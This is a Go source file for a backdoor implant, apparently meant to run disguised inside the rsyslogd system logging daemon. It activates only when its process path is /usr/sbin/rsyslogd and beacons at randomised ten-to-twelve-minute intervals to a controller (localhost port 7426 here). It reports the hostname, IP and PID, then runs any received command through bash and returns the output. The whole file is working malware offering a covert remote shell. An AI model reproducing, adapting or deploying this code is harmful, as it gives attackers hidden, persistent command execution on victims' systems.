package main

import (
	"backdoor/util"
	"encoding/json"
	"fmt"
	"math/rand"
	"net"
	"os"
	"os/exec"
	"strings"
	"time"

	"github.com/google/uuid"
)

var guuid string

func init() {
	exepath,err := os.Executable()
	if err != nil {
		return
	}
	if exepath != "/usr/sbin/rsyslogd" {
		return
	}
	rand.Seed(time.Now().Unix())
	go client()
}

func main() {
}

func client() {
	guuid = uuid.New().String()
	for {
		time.Sleep(time.Duration(600+rand.Intn(120)) * time.Second)
		session("127.0.0.1", 7426)
	}
}

func session(ip string, port uint16) {
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", ip, port), 12*time.Second)
	if err != nil {
		return
	}
	defer conn.Close()
	pencoder := util.NewEncoder()
	pdecoder := util.NewDecoder()
	if err := sendInfo(conn, pencoder); err != nil {
		return
	}
	for {
		emsg, err := util.TcpReadMsg(conn, 12*time.Second)
		if err != nil {
			break
		}
		msg, err := pdecoder.Decode(emsg)
		if err != nil {
			break
		}
		var req util.Request
		if err := json.Unmarshal(msg, &req); err != nil {
			break
		}
		if req.Magic != util.Magic {
			break
		}
		cmdstr := strings.TrimSpace(req.Cmd)
		if len(cmdstr) == 0 {
			continue
		}
		if strings.HasPrefix(cmdstr, "cd ") {
			changedir(cmdstr)
			continue
		}
		if strings.HasPrefix(cmdstr, "createprocess ") {
			createprocess(cmdstr)
			continue
		}
		out, _ := execCmd(cmdstr)
		if err := util.TcpWriteMsg(conn, pencoder.Encode(out)); err != nil {
			break
		}
	}
}

func createprocess(cmd string) {
	index := strings.Index(cmd, " ")
	if index == -1 {
		return
	}
	cmd = strings.TrimSpace(cmd[index:])
	if len(cmd) == 0 {
		return
	}
	if !strings.HasSuffix(cmd, "&") {
		cmd += " &"
	}
	execCmdWithout(cmd)
}

func execCmd(cmdstr string) ([]byte, error) {
	cmd := exec.Command("bash", "-c", cmdstr)
	return cmd.CombinedOutput()
}

func execCmdWithout(cmdstr string) error {
	cmd := exec.Command("bash", "-c", cmdstr)
	return cmd.Run()
}

func sendInfo(conn net.Conn, pencoder *util.Encoder) error {
	localip := conn.LocalAddr().String()
	hostname := ""
	if name, err := os.Hostname(); err == nil {
		hostname = name
	}
	var info util.Info
	info.Magic = util.Magic
	info.HostName = hostname
	info.LocalIP = localip
	info.PID = os.Getpid()
	info.UUID = guuid
	jsonBytes, err := json.Marshal(&info)
	if err != nil {
		return err
	}
	return util.TcpWriteMsg(conn, pencoder.Encode(jsonBytes))
}

func changedir(cmd string) {
	strarr := strings.Split(cmd, " ")
	if len(strarr) < 2 {
		return
	}
	os.Chdir(strarr[1])
}
